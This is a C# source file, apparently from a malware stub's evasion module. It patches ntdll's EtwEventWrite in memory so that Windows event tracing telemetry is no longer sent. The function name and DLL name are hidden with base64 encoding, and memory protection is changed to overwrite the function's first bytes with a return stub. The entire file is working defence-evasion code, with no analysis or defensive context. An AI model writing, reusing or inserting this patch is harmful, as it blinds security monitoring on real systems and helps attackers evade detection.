using System;
using System.Runtime.InteropServices;
using NRE.Core.Common;

namespace NRE.Stub.Evasion
{
    /// <summary>
    /// ETW bypass by patching EtwEventWrite (ntdll) so telemetry is not sent.
    /// </summary>
    public static class EtwPatch
    {
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
        private static extern IntPtr LoadLibrary(string lpLibFileName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        public static bool Patch()
        {
            try
            {
                string ntdllName = RuntimeStrings.Decode("bnRkbGwuZGxs");
                IntPtr ntdll = LoadLibrary(ntdllName);
                if (ntdll == IntPtr.Zero) return false;

                string procName = RuntimeStrings.Decode("RXR3RXZlbnRXcml0ZQ==");
                IntPtr addr = GetProcAddress(ntdll, procName);
                if (addr == IntPtr.Zero) return false;

                byte[] patch = new byte[] { 0x48, 0x31, 0xC0, 0xC3 };
                uint oldProt;
                if (!NativeMethods.VirtualProtect(addr, (UIntPtr)patch.Length, NativeMethods.PAGE_EXECUTE_READWRITE, out oldProt))
                    return false;
                try
                {
                    Marshal.Copy(patch, 0, addr, patch.Length);
                    return true;
                }
                finally
                {
                    NativeMethods.VirtualProtect(addr, (UIntPtr)patch.Length, oldProt, out oldProt);
                }
            }
            catch (Exception)
            {
                return false;
            }
        }
    }
}
